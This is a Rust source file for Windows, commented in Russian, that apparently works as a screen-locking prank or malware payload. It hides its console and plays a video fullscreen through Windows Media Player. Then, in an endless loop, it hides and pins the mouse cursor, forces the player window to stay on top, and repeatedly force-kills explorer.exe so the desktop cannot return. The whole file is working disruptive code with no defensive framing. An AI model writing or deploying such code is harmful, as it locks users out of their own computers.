#![windows_subsystem = "windows"]

use std::process::Command;
use std::ptr::null_mut;
use std::thread;
use std::time::Duration;
use winapi::um::winuser::{
    FindWindowW, SetWindowLongW, GWL_EXSTYLE, WS_EX_TOPMOST,
    WS_EX_NOACTIVATE, WS_EX_TOOLWINDOW, ShowWindow, SW_SHOWMAXIMIZED,
    SetForegroundWindow, BringWindowToTop, ShowCursor, SetCursorPos
};

fn main() {
    let video = std::env::var("SYSTEMROOT").unwrap() + "\\System32\\video.mp4";
    
    // Запускаем Windows Media Player
    let _ = Command::new("wmplayer")
        .arg(&video)
        .args(["/fullscreen", "/play", "/close"])
        .spawn();

    // Бесконечный цикл удержания
    loop {
        unsafe {
            // Прячем курсор
            ShowCursor(0); // 0 = FALSE
            
            // Устанавливаем курсор в левый верхний угол
            SetCursorPos(0, 0);
            
            // Ищем окно плеера
            let wmp_class: Vec<u16> = "WMPlayerApp\0".encode_utf16().collect();
            let hwnd = FindWindowW(wmp_class.as_ptr(), null_mut());
            
            if !hwnd.is_null() {
                // Делаем окно поверх всех
                SetWindowLongW(
                    hwnd,
                    GWL_EXSTYLE,
                    (WS_EX_TOPMOST | WS_EX_NOACTIVATE | WS_EX_TOOLWINDOW) as i32
                );
                ShowWindow(hwnd, SW_SHOWMAXIMIZED);
                SetForegroundWindow(hwnd);
                BringWindowToTop(hwnd);
            }
            
            // Проверяем, не появился ли рабочий стол
            let progman_class: Vec<u16> = "Progman\0".encode_utf16().collect();
            let exp = FindWindowW(progman_class.as_ptr(), null_mut());
            if !exp.is_null() {
                let _ = Command::new("taskkill")
                    .args(["/f", "/im", "explorer.exe"])
                    .status();
            }
        }
        
        thread::sleep(Duration::from_millis(100));
    }
}
